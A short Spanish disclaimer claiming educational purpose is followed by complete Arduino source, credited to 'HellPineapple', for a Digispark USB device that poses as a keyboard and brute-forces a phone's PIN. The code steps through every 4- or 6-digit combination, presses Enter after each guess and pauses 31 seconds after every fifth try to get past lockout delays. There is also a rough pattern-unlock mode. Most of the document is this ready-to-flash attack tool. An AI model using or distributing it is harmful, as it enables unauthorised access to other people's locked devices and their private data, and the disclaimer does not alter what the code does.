Renuncia
Se proporcionan ejemplos de código con fines educativos. Las defensas adecuadas solo se pueden construir investigando las técnicas de ataque disponibles para los actores maliciosos. El uso de este código contra los sistemas de destino sin permiso previo es ilegal en la mayoría de las jurisdicciones. Los autores no son responsables de ningún daño derivado del mal uso de esta información o código.

# Digispark3Mex By: HellPineapple

#include "DigiKeyboard.h"

// Key mapping for digits 0-9
int num[] = {39, 30, 31, 32, 33, 34, 35, 36, 37, 38};

// Key mapping for pattern nodes
int patternNodes[] = {44, 45, 46, 47, 48, 49, 50, 51, 52}; // Example

// Configuration
const int PIN_LENGTH = 4; // Change to 6 for a 6-digit PIN
bool usePattern = false; // Change to true to use pattern unlock

// Variables for PIN
int digits[6] = {0, 0, 0, 0, 0, 0};

// Variables for pattern
const int PATTERN_LENGTH = 4; // Length of the unlock pattern
int pattern[9] = {0, 0, 0, 0, 0, 0, 0, 0, 0}; // Stores the pattern sequence

const int ENTER_KEY = 40;
const int DELAY_TIME = 31000;

int attemptCount = 0;

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  delay(3000);
}

void sendKeys(int* keyMap, int* values, int length) {
  for (int i = 0; i < length; i++) {
    DigiKeyboard.sendKeyStroke(keyMap[values[i]]);
  }
  DigiKeyboard.sendKeyStroke(ENTER_KEY); // Enter
  delay(1000);
}

void incrementValues(int* values, int length, int max) {
  for (int i = length - 1; i >= 0; i--) {
    values[i]++;
    if (values[i] < max) break;
    values[i] = 0;
  }
}

void loop() {
  if (attemptCount == 5) {
    digitalWrite(1, HIGH); // LED on to indicate delay
    DigiKeyboard.sendKeyStroke(ENTER_KEY); // Enter to dismiss any popup
    delay(DELAY_TIME);
    attemptCount = 0;
    digitalWrite(1, LOW); // LED off
  }

  if (usePattern) {
    sendKeys(patternNodes, pattern, PATTERN_LENGTH);
    incrementValues(pattern, PATTERN_LENGTH, 9);
  } else {
    sendKeys(num, digits, PIN_LENGTH);
    incrementValues(digits, PIN_LENGTH, 10);
  }

  attemptCount++;
}
